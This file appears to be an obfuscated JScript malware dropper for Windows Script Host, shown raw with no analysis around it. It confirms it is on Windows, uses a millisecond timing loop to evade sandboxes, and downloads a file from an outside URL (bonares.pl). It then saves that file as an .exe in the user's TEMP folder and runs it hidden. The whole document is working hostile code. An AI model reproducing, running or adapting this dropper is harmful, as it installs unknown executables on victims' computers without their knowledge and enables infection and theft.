var _G0 = false;
var _Q = "CreateObject";
var _H0 = function _A() {return WScript[_Q]("WScript"+".Shell");}(), _S0 = 11;
var _YE = "MSXML2.XMLHTTP";
var _H = 2123213;
var _EJ = 0;
function _A0(_EO){_H0["Run"](_EO, _EJ, _EJ);};
function _TE(){return _YE + "";};
function _UJ(_NB, _M0){_EJ = _EJ * 1; return _NB - _M0;};
function _D(){return _Q;};
/*@cc_on
  @if (@_win32 || @_win64)
    _G0 = true;
  @end
@*/
if (_G0)
{
var _S = "";
function _RZ(){return 22;};
var _BD = 0; var _HO = 0;
function _W()
{
var _K = new this["Date"]();
var _U = _K["getUTCMilliseconds"]();
WScript["Sleep"](_RZ());
var _K = new this["Date"]();
var _Z = _K["getUTCMilliseconds"]();
WScript["Sleep"](_RZ());
var _K = new this["Date"]();
var _IT = _K["getUTCMilliseconds"]();
var _BD = "_JF";
_BD = _UJ(_Z, _U);
var _HO = "_V";
_HO = _UJ(_IT, _Z);
_S = "open";
return _UJ(_BD, _HO);
}
var _PV = false;
var _G = false;
for (var _M = _EJ; _M < _RZ() * 1; _M++){if (_W() != _EJ){
_PV = true; 
_HO = "31" + 11 * _BD + _HO; 
_G = true; 
break;
}}
function _JM() {return ((_PV == true) && (_PV == _G)) ? 1 : _EJ;};
if (_PV && _JM() && _G){
function _R() {return _H0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "L2Fp6Qi64qIm.ex" + "e";};
 _OI = _TE();
 _RO = WScript[_Q](_OI);
 var _J = 1;
 while (_J){
try {
	if (_J == 1)
	{
		_RO[_S]("GET", "http://bonares.pl/x9isa", false);
		_RO["send"]();
		_SK = "Sleep";
	}
	WScript[_SK](_RZ() + 120); 
	if (_RO["readystate"] < 2 * 2) continue;
	_J = _EJ;
	function _HA(_N) {var _SL = (1, 2, 3, 4, 5, _N); return _SL;};
	_HW = WScript[_D()]("ADODB.Stream");
	_OI = _HW;
	_OI[_S]();
	_OI["type"] = _HA(1);
	_OI["write"](_RO["ResponseBody"]);
	_HW["position"] = _HA(_EJ);
	_OI["Save" + "ToFile"](_R(), 2);
	_HW["cl"+"ose"]();
	_YD = _R();
	_A0(_YD);
} catch(_C){};
}
}
}

